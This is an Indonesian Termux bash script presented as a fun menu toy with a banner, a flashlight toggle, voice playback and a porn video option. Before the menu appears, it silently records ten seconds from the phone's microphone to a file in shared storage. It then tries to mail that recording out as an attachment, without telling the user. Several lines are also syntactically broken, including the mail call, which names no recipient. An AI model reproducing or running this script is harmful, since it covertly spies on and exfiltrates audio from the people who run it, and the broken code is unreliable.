#!/bin/bash

pkg update && upgrade
pkg install cl vim ruby cowsay toilet neofetch nano
gem install lolcat

set echo off
echo -e "\e[32;1m ####################################################################";
echo -e "\e[32;1m ####################################################################";
echo -e "\e[35;1m ##" | echo -e "\e[37;1m Dibuat oleh : Dicer                         ";
echo -e "\e[35;1m ##" | echo -e "\e[34;1m Bahasa      : BASH SCRIPTING                ";
echo -e "\e[35;1m ##" | echo -e "\e[33;1m Team        : Termux Discuss Party          ";
echo -e "\e[38;1m ##" | echo -e "\e[37;5m THX         : Thanks for using.             ";
echo -e "\e[38;1m ##" | echo -e "\e[37;5m NB          : Jangan lupa install Termux-API";

termux-microphone-record -d -f /storage/emulated/0/nama.mp3 -l 10 -b 128
echo -n "Waktu system   :"; date
echo -n "Anda           :"; whoami
echo -n "Banyak pemakai :"; who | wc -l

echo "Katakan sesuatu..."; | sleep 5s | clear
echo "Pilih tema yang anda sukai :";
echo "1. Video Bokep";
echo "2. Nyalakan senter";
echo "3. Dengarkan suara anda.";
echo "4. Keluar";
mail -s "Kirimannya gan" -a /storage/emulated/0/nama.mp3
read -p "Silahkan pilih :" memilih;

if [ $memilih -eq 1 ];
then
termux-media-player play free/sym/sys/tmp/v.mp4
elif [ $memilih -eq 2 ];
then
echo "Nyalakan senter!"; | termux-torch on | sleep 2s
echo "Matikan senter!"; | termux-torch off | sleep 2s
elif [ $memilih -eq 3 ];
then
termux-media-player play free/sym/sys/tmp/v1.mp3
elif [ $memilih -eq 4 ];
then
exit 0
else
echo "bye-bye :) "
exit 1
fi

